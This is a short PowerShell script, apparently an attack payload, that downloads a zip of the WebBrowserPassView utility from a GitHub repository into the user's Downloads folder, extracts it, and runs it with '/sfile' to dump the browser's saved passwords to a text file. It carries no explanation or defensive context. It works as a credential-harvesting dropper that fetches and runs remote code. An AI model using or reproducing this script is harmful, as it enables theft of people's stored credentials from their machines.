$nameFile="WebBrowserPassView"
$runDirectory="$env:USERPROFILE\downloads"

$zipFolder="$runDirectory\$nameFile.zip"
$unzipFolder="$runDirectory\$nameFile"
$exeFile="$unzipFolder\$nameFile.exe"
$txtFile="$unzipFolder\$nameFile.txt"

$params="/sfile $txtFile"


Set-Location -path $runDirectory
Invoke-RestMethod -Uri "https://github.com/MaxAxoft/demo/blob/main/$nameFile.zip" -Method Get -OutFile $zipFolder
Expand-Archive $zipFolder -DestinationPath $unzipFolder
& "$exeFile" $params
$txtFile
